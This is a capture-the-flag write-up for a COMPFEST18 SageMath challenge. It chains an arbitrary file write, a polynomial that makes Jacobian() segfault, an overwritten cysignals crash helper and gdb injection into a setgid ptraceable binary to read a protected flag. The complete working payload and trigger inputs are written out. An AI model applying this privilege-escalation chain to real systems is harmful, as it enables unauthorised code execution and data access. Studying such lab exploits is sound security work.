# Jacobian as a Service

COMPFEST18 · misc/pwn · author: [kristoferUA](https://github.com/kristoferUA)

The challenge exposes a small SageMath service. We can enter a polynomial over `GF(p)`, the server computes `Jacobian(f)`, and there is also a suspicious bug report feature that writes an arbitrary file.

```text
nc 34.2.22.80 30043
```

Flag:

```text
COMPFEST18{the_jacobian_conjecture_is_false_claude_iGJ6cjeuKbA6uLdJ}
```

## Challenge summary

The important part of `chall.py` is:

```python
p = int(input("Enter a prime number p: "))
F = GF(p)

R = F['x, y']; (x, y,) = R._first_ngens(2)
expression = input("Enter a polynomial expression : ")
allowed_chars = set("0123456789+-*/^xy ")
if (not set(expression).issubset(allowed_chars) or not set("xy").issubset(set(expression))):
    raise ValueError()
f = R(expression)

E = Jacobian(f)
print(E)
```

The bug report handler is even more interesting:

```python
name = input("bug name: ")
description = input("description: ")
with open(name, "w") as report:
    report.write(description)
```

So we get an arbitrary file write as the `sage` user.

The Dockerfile also gives us the real target:

```dockerfile
ln -s "$sage_venv/bin/cysignals-CSI" /opt/ctf/cysignals-CSI
```

and a setgid helper:

```dockerfile
gcc ... -o /home/ctf/tes /home/ctf/wut.c
chown target:target /home/ctf/tes
chmod 2755 /home/ctf/tes
printf 'COMPFEST18{test_flag}\n' > /home/ctf/flag.txt
chown target:target /home/ctf/flag.txt
chmod 440 /home/ctf/flag.txt
```

The flag is readable by group `target`, and `/home/ctf/tes` runs with that group.

## The crash primitive

The polynomial filter looks restrictive, but it only checks two things:

1. every character must be from `0123456789+-*/^xy `;
2. both `x` and `y` must appear somewhere in the string.

It does not require the polynomial to really depend on `x` or `y`.

This expression passes the filter, but Sage simplifies it to a constant:

```text
0*x+0*y+3
```

Then `Jacobian(f)` reaches a buggy SageMath path and segfaults. The crash itself is useful because Sage uses `cysignals`, and `cysignals` tries to run the helper program `cysignals-CSI` while printing crash information.

## Turning file write into code execution

The arbitrary file write can overwrite `/opt/ctf/cysignals-CSI`. This path is a symlink to the real `cysignals-CSI` binary inside the Sage venv, so after the overwrite the crash handler executes our shell script instead.

The first idea is simple:

```sh
cat /home/ctf/flag.txt
```

but it runs as `sage`, not as `target`, so it cannot read the flag.

The Dockerfile gives us a better primitive:

```dockerfile
apt-get install -y ... gdb ...
setcap cap_sys_ptrace+ep /usr/bin/gdb
```

and the helper binary does this:

```c
prctl(PR_SET_DUMPABLE, 1);
prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY);
raise(SIGSTOP);

for (;;)
    pause();
```

So `/home/ctf/tes` intentionally makes itself ptraceable and stops. Since it is setgid `target`, if we attach GDB to it and call `execl("/bin/cat", ...)`, the new `/bin/cat` process keeps the useful group and prints the flag.

## Final payload

First, overwrite the crash helper through the bug report feature:

```text
2
/opt/ctf/cysignals-CSI
/home/ctf/tes & p=$!; sleep 0.5; /usr/bin/gdb -q -nx -p $p -batch -ex 'b pause' -ex 'signal 0' -ex 'call (int)execl("/bin/cat","cat","/home/ctf/flag.txt",(char*)0)' 2>&1
```

Then trigger the Sage crash:

```text
1
11
0*x+0*y+3
```

The `b pause` and `signal 0` part is needed because the helper raises `SIGSTOP`. Without clearing that signal, the function call from GDB may be abandoned before `execl` runs.

The relevant output contains a lot of crash noise, but the flag appears in the middle:

```text
process 217 is executing new program: /usr/bin/cat
COMPFEST18{the_jacobian_conjecture_is_false_claude_iGJ6cjeuKbA6uLdJ}
```

The later `Unhandled SIGSEGV` is expected. It is just the original Sage process dying after the exploit has already printed the flag.

## Running it

The included `solve.py` only sends the payload. It does not contain the CTFd access token, so pass it manually when needed:

```bash
python3 solve.py --host 34.2.22.80 --port 30043 --token '<CTFd access token>'
```

For a local Docker run from the original challenge files:

```bash
cd challenge
./run.sh
python3 ../solve.py --host 127.0.0.1 --port 8080
```

## Repository layout

```text
README.md             writeup
solve.py              payload sender
payload.txt           raw manual payload
challenge/            original files from dist.zip
```

## Notes

This is a nice chain because each part looks almost useless alone:

- arbitrary file write as `sage`;
- a SageMath crash in `Jacobian()`;
- `cysignals-CSI` being executable during crashes;
- a setgid helper that deliberately allows ptrace;
- `gdb` with `cap_sys_ptrace`.

Together they become a clean local privilege boundary bypass inside the container.
